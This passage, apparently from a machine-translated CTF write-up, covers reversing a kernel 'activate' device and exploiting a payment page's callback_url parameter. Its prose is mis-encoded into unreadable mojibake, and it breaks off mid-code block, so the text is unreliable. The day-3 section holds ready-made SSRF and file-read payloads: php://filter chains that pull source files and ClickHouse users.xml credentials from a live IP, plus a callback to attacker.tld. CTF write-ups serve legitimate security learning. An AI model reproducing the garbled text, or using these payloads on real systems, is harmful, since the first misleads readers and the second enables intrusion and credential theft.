рджреЗрдЦрдиреЗ рдХрд╛ рд╣реИред  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЗрд╡реАрдПрдо рдореЗрдВ рдПрдореБрд▓реЗрдЯрд░ рдЪрд▓рд╛рдПрдВ: </p><br><pre> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p>  рд▓рд┐рдирдХреНрд╕ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рддреБрд░рдВрдд рдУрд╡рд░рд▓реЗ рд╕реЗ <code>/bin/activator</code> рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рддрд╛ рд╣реИред  рдпрд╣ <code>/etc/inittab</code> рдореЗрдВ рд╡рд░реНрддрдиреА рд╣реИред  рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдмрд┐рдирд╛рд░ рдореЗрдВ рдЦреБрджрд╛рдИ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛ рдФрд░ рдХрдо рд╕реЗ рдХрдо <code>/proc</code> рдкреНрд░реЛрдХ рдФрд░ рд╕реАрд╕ рдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛ред  рдореЗрд░реЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдпрд╣ рдерд╛ рдХрд┐ рдореИрдВ рдХреЗрд╡рд▓ рдЙрд╕ рдЬрдЧрд╣ рдкрд░ рдЖрдЗрд╕реЛ рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реВрдВ рдЬрд╣рд╛рдВ рдПрдХреНрдЯрд┐рд╡рд┐рд╕реНрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЦреБрдж рд╕реНрдерд┐рдд рд╣реИред  рдмрд▓реНрдХрд┐ <code>sleep 1</code> рдкреБрдЯ <code>/bin/sh</code> , рдпрд╛рдиреА  рдзрд╛рд░рд╛рд╡рд╛рд╣рд┐рдХ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдпрд╛рд╕ рдХреЗ рдмрд╛рдж рдореБрдЭреЗ рдПрдХ рдЦреЛрд▓ рдорд┐рд▓рд╛ред </p><br><p>  рддреЛ рдПрдХ рд╢реЗрд▓ рд╣реИ: рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ <code>/proc/kallsyms</code> рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ, рдЕрд░реНрдерд╛рддреНред  рдХреЛрдИ рдЧрд┐рд░реА рдкреНрд░рддреАрдХреЛрдВред  рдЙрдирдХреЗ рд╕рд╛рде, рдЬрд╝рд╛рд╣рд┐рд░ рд╣реИ, рдпрд╣ рдмрд╣реБрдд рддреЗрдЬрд╝ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдареАрдХ рд╣реИред  рд╣рдо рдбрд┐рд╡рд╛рдЗрд╕ <code>/dev/activator</code> рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреА рддрд▓рд╛рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ: </p><br><pre> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p>  рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рд╕реЗ <code>/proc/devices</code> рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдЪрд░рд┐рддреНрд░ (рдЪрд╛рд░) рдбрд┐рд╡рд╛рдЗрд╕ рд╣реИ, рдЬреЛ рдкреНрд░рдореБрдЦ 252 рдФрд░ рдирд╛рдмрд╛рд▓рд┐рдЧ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг - 0ред </p><br><p>  рдпрд╣ рдХрд░реНрдиреЗрд▓ рдмрд┐рдирд╛рд░ рдореЗрдВ рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЗ рдкрдВрдЬреАрдХрд░рдг рд╕рдорд╛рд░реЛрд╣ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХреЗ <code>write</code> рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рд╣реИрдВрдбрд▓рд░ рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдордп рд╣реИред  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реНрдЯреНрд░рд┐рдВрдЧ <code>activate</code> рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВред  рд▓реЗрдХрд┐рди рдХрд░реНрдиреЗрд▓ рдореЗрдВ рдРрд╕реА рдХреЛрдИ рд░реЗрдЦрд╛ рдирд╣реАрдВ рд╣реИ, рд╢рд╛рдпрдж рдпрд╣ рдХрд┐рд╕реА рддрд░рд╣ рдЫрд┐рдкрд╛ рд╣реБрдЖ рд╣реИред </p><br><p>  : рдЕрдЧрд▓рд╛ рдкреНрд░рдпрд╛рд╕ рдХрд╛рд░реНрдпреЛрдВ рдХрд┐ рдЪрд░рд┐рддреНрд░ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдкрдВрдЬреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИрдВ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП <code>cdev_add</code> рдФрд░ <code>register_chrdev</code> ред  рдпрд╣ рдХреНрд░реЙрд╕-рд░реЗрдлрд╝рд░рд┐рдВрдЧ <code>/dev/console</code> рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд░реНрдг рдбрд┐рд╡рд╛рдЗрд╕ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрд░реНрдиреЗрд▓ рд╕реНрд░реЛрдд рдХреЛрдб рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдореИрдВрдиреЗ рд╕рдВрд╕реНрдХрд░рдг 5.0.11 рд▓рд┐рдпрд╛, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рд╕рдВрд╕реНрдХрд░рдг рд╕рд╣реА рд╣реИ)ред  рдЙрдкрдХрд░рдгреЛрдВ рдХрд┐ рдкрдВрдЬреАрдХреГрдд рд╣реИрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦреЗрдВ, рдирд╣реАрдВ рд╡рд╣рд╛рдБ рдореБрдЦреНрдп рд╕рдВрд╕реНрдХрд░рдг 252 рд╢рд╛рдпрдж рдкрдВрдЬреАрдХрд░рдг рдХреЗ рд╕рд╛рде рдПрдХ рдбрд┐рд╡рд╛рдЗрд╕ рд╣реИ рдирд╣реАрдВ рдЗрди рджреЛрдиреЛрдВ рдХрд╛рд░реНрдпреЛрдВ рд╣реИред </p><br><p>  рдЖрдЗрдП рдЧрддрд┐рд╢реАрд▓рддрд╛ рдореЗрдВ рдХреБрдЫ рдЕрдиреНрдп рд╕реБрд░рд╛рдЧ рджреЗрдЦрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ: </p><br><pre> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p>  рдпрд╣рд╛рдБ <code>EEy????I</code> - <code>EEy????I</code> рдбрд┐рд╡рд╛рдЗрд╕ <code>EEy????I</code>  рд╣рдо рдЗрд╕ рд▓рд╛рдЗрди рдХреЛ рдмрд┐рдирд╛рд░ рдореЗрдВ рдЦреЛрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рд╡рд╣рд╛рдВ рд╣реИ! </p><br><p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p>  рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдХрд╛ рдХреЛрдИ рдХреНрд░реЙрд╕-рд░реЗрдлрд░реЗрдВрд╕ рдирд╣реАрдВ рдорд┐рд▓рд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдмрдЧрд▓ рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЗ рд╕рдорд╛рди рдбреЗрдЯрд╛ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред  рдЖрдк рдХреЛрдб рдХреЛ рджреЗрдЦреЛ, рддреЛ рд╣реИ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдпрд╣ рд╣реИ рдХрд┐ рдЗрди рдЖрд╡рд╢реНрдпрдХ рд╕рдВрдЪрд╛рд▓рдХреЛрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд▓рд┐рдЦрдиреЗ рдбрд┐рд╡рд╛рдЗрд╕ рд╣реИрдВ рджреЗрдЦреЗрдВрдЧреЗ <code>activate</code> рд╣реИ, рдЬреЛ рдПрдХ рд╕рд░рд▓ XOR рджреНрд╡рд╛рд░рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реЛрддреЗ рд╣реИрдВред </p><br><p>  рдкрдврд╝рдиреЗ рдЖрдкрд░реЗрд╢рди рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рд╕рдорд╛рд░реЛрд╣: </p><br><p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p>  рд▓реЗрдЦрди рдСрдкрд░реЗрд╢рди рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░реНрдп, рдпрд╣ рдПрдХ рд▓рд╛рдЗрд╕реЗрдВрд╕ рдЬрд╛рдВрдЪ рднреА рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p>  рд╕рдХреНрд░рд┐рдпрдг рд╕рддреНрдпрд╛рдкрди рдХреЛрдб рдХреЗ рдПрдХ рддреНрд╡рд░рд┐рдд рдирд┐рд░реАрдХреНрд╖рдг рд╕реЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдХреЗрд╡рд▓ <code>0xFFFFFFFF811F094B</code> рдкрддреЗ рдкрд░ рдПрдХ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рдбрд╛рд▓рдирд╛ рдФрд░ рд╡рд╣рд╛рдВ рдХреНрдпрд╛ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рджрд┐рдП рдмрд┐рдирд╛ рд╕рдХреНрд░рд┐рдпрдг рдХреЛрдб рдХреЛ рдЪреБрдирдирд╛ рдЖрд╕рд╛рди рд╣реИред  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, q -u рдХреЛ <code>-s</code> рдзреНрд╡рдЬ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдБред  рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, qemu gdb рд╕реНрдЯрдм рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рднреА gdb рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред  рдЖрдИрдбреАрдП рдкреНрд░реЛ рдореЗрдВ рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рдФрд░ рддреЗрдЬрд╝ рддрд░реАрдХрд╛ рд╣реИ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓рд╛рдЗрд╕реЗрдВрд╕ рд╣реИред  рд▓реЗрдХрд┐рди рдХрдВрд╕реЛрд▓ рдЬреАрдбреАрдмреА рдореЗрдВ рд╕рдм рдХреБрдЫ рдХрд░рдиреЗ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рдордирд╛ рдирд╣реАрдВ рд╣реИред </p><br><p>  рд╣рдо рдЖрдзрд┐рдХрд╛рд░рд┐рдХ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓</a> рдореЗрдВ рд╡рд░реНрдгрд┐рдд рд╕рдм рдХреБрдЫ рдХрд░рддреЗ рд╣реИрдВред  рдЕрдм рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣реЗ рдХрд░реНрдиреЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p>  рдЪреВрдВрдХрд┐ рдХрд░реНрдиреЗрд▓ KASLR рд╕рдорд░реНрдерди рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЪрд╛рд▓реВ рдХрд░реНрдиреЗрд▓ рдХреЗ рдкрддреЛрдВ рдХреЛ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдСрдлрд╝рд╕реЗрдЯ рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдХрд░реНрдиреЗрд▓ рд╢реБрд░реВ рд╣реЛрдиреЗ рдкрд░ рд╣рд░ рдмрд╛рд░ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред  рд╣рдо рдЗрд╕ рдСрдлрд╕реЗрдЯ рдХреА рдЧрдгрдирд╛ рдХрд░рддреЗ рд╣реИрдВ (рд╣рдо рдбрд┐рдмрдЧ рдХрд┐рдП рдЧрдП рдХрд░реНрдиреЗрд▓ рдХреЗ рдХреЛрдб рдореЗрдВ рдЕрджреНрд╡рд┐рддреАрдп рдмрд╛рдЗрдЯ рдЕрдиреБрдХреНрд░рдо рдХрд╛ рдкрддрд╛ рд▓реЗрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдХреНрд░рдо рдХреЗ рдмрд┐рдирд╛рд░ рд╕реЗ рдкрддреЗ рдХреЛ рдШрдЯрд╛рддреЗ рд╣реИрдВ) рдФрд░, рд╕рдХреНрд░рд┐рдпрдг рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрддреЗ рдореЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реБрдП, рд╣рдо рдЗрд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ рдкрд╛рддреЗ рд╣реИрдВред  рд╕рдм рдХреБрдЫ, рдЕрдм рдпрд╣ рдЫреЛрдЯреЗ рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИред  рдПрдХ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдХреЛрдб рдЪреБрдиреЗрдВред </p><br><p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p>  рдЗрд╕ рдХрд╛рд░реНрдп рдХрд╛ рд╕рдорд╛рдзрд╛рди рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╣рдм рдкрд░ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред  рдЖрдк рдпрд╣рд╛рдВ рд╕реЗ рдкрд░рд┐рдЪрд┐рдд рд╣реЛ рд╕рдХрддреЗ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рд╣реИрдВ</a> ред </p><br><h2>  рджрд┐рди 3. рдирд┐рдХрд╛рдп рдХреЗ рд╕рджрди </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  рд╡рд┐рдЬреЗрддрд╛рдУрдВ </td></tr><tr><td align="center">  <b>рдкрд╣рд▓рд╛ рд╕реНрдерд╛рди</b> </td></tr><tr><td align="center">  blackfan </td></tr></tbody></table></div><br><p>  рдмреЗрдХреНрдб ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">DeteAct</a> ) рджреНрд╡рд╛рд░рд╛ рддреИрдпрд╛рд░ рдХреА рдЧрдИ рдиреМрдХрд░реАред  рдкреНрд░рддрд┐рднрд╛рдЧрд┐рдпреЛрдВ рдХреЛ рдПрдХ рдЕрдЪреВрдХ рднреБрдЧрддрд╛рди рдкреГрд╖реНрда рджреНрд╡рд╛рд░рд╛ рдмрдзрд╛рдИ рджреА рдЧрдИред  рд╕рдорд╛рдзрд╛рди рдХреЗ рд▓рд┐рдП, php рдлрд╝рдВрдХреНрд╢рди <code>file_get_contents</code> рдХреА рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Clickhouse рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЖрд╡рд╢реНрдпрдХ рдерд╛ред </p><br><div class="spoiler">  <b class="spoiler_title">рддреАрд╕рд░реЗ рджрд┐рди рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдгрдп (рдХрд╛рд▓рд╛рдзрди)</b> <div class="spoiler_text"><p>  рдХрд╛рд░реНрдп рдПрдХ рднреБрдЧрддрд╛рди рдкреГрд╖реНрда рд╣реИ, рдЬрд╣рд╛рдВ рдПрдХрдорд╛рддреНрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░ callback_url рдерд╛ред </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p>  рд╣рдо рдЖрдкрдХреА рд╕рд╛рдЗрдЯ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЛ рдкрдХрдбрд╝рддреЗ рд╣реИрдВ: </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=http://attacker.tld/&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="plaintext hljs">POST / HTTP/1.0 Host: attacker.tld Connection: close Content-Length: 21 Content-Type: application/json amount=0&amp;payment_id=0</code> </pre> <br><p>  рдпрджрд┐ рд╕рд╛рдЗрдЯ рдЕрд▓реНрдлрд╝рд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд▓реМрдЯрд╛рддреА рд╣реИ рддреЛ рдХреЗрд╡рд▓ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИред  рдЬрд╡рд╛рдм рдХреЗ рдЙрджрд╛рд╣рд░рдг: </p><br><pre> <code class="plaintext hljs">{"result":"Success.","msg":"Response: testresponse"} {"result":"Invalid status code.","msg":"Non-alphanumeric response."}</code> </pre> <br><p>  рд╣рдо callback_url рдбреЗрдЯрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ :, рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ рдФрд░ рд╕рдордЭреЗрдВ рдХрд┐, рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ, рдпрд╣ PHP рд╣реИред </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=data:,test&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  рд╣рдо рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП php: // рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдХрдиреНрд╡рд░реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдиреНрдХреЛрдб рдХрд░рддреЗ рд╣реИрдВ редрдмреЗрд╕ -64-рдПрдирдХреЛрдб рддрд╛рдХрд┐ рдЙрддреНрддрд░ рдЕрд▓реНрдлрд╝рд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реЛред  рд╡рд░реНрдг +, / рдФрд░ = рдХреЗ рдХрд╛рд░рдг, рдХрднреА-рдХрднреА рдЙрддреНрддрд░ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдмреЗрд╕ 64 рдХреЙрд▓ рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./index.php http://82.202.226.176/?pan=xxx&amp;amount=xxx&amp;payment_id=xxx&amp;callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=./includes/db.php</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-comment"><span class="hljs-comment">/* * DB configuration */</span></span> $config = [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'port'</span></span></code> </pre> <br><p>  рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЖрдЙрдЯрдкреБрдЯ 200 рдмрд╛рдЗрдЯреНрд╕ рддрдХ рд╕реАрдорд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рдЯреБрдХрдбрд╝реЛрдВ рд╕реЗ рд╣рдо рд╕реНрдерд╛рдиреАрдпрд╣реЛрд╕реНрдЯ рдкрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдЙрдкрд▓рдмреНрдзрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрддреЗ рд╣реИрдВред  рд╣рдо callback_url рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрдВрджрд░рдЧрд╛рд╣реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЙрд░реНрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">DeteAct рдмреНрд▓реЙрдЧ рдкрд░ ClickHouse рдореЗрдВ рдЗрдВрдЬреЗрдХреНрд╢рди рдкрд░</a> рдПрдХ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдирдпрд╛ рд▓реЗрдЦ рдвреВрдВрдврддреЗ рд╣реИрдВ</a> , рдЬреЛ рдЕрдЬреАрдм рдХрд╛рд░реНрдп рдирд╛рдо "HOUSE OF BECHED" рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/5fb/f00/b42/5fbf00b42a4499e928edfd469a81e755.png" alt="https://i.imgur.com/OBn22wi.png"></p><br><p>  ClickHouse рдореЗрдВ рдПрдХ HTTP рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдордирдорд╛рдиреЗ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ SSRF рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рд╣реИред </p><br><p>  рд╣рдо рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдкрдврд╝рддреЗ рд╣реИрдВ, рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗ рдЦрд╛рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">yandex</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Profiles of settings. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">profiles</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Default settibm</span></span></code> </pre> <br><p>  рдлрд┐рд░ рд╕реЗ, рдЙрддреНрдкрд╛рджрди рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдирд╛ рдФрд░ рдорд╛рдирдХ рдлрд╝рд╛рдЗрд▓ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдгрдп рд▓реЗрдирд╛, рд╡рд╛рдВрдЫрд┐рдд рдХреНрд╖реЗрддреНрд░ рдмрд╣реБрдд рджреВрд░ рд╣реИред </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/6e8/6f9/35f/6e86f935fc695b845a63aebbbcd76626.png" alt="https://i.imgur.com/5Un6gfj.png"></p><br><p>  String.strip_tags рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрд╛рдЯ рд▓реЗрдВред </p><br><pre> <code class="plaintext hljs">http://82.202.226.176/?callback_url=php://filter/string.strip_tags|convert.base64-encode/resource=/etc/clickhouse-server/users.xml&amp;pan=&amp;amount=&amp;payment_id=</code> </pre> <br><p>  рд▓реЗрдХрд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рддрдХ рдЖрдЙрдЯрдкреБрдЯ рд▓рдВрдмрд╛рдИ рдЕрднреА рднреА рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИред  рдПрдХ рд╕рдВрдкреАрдбрд╝рди рдлрд╝рд┐рд▓реНрдЯрд░ zlib.deflate рдЬреЛрдбрд╝реЗрдВред </p><br><pre> <code class="plaintext 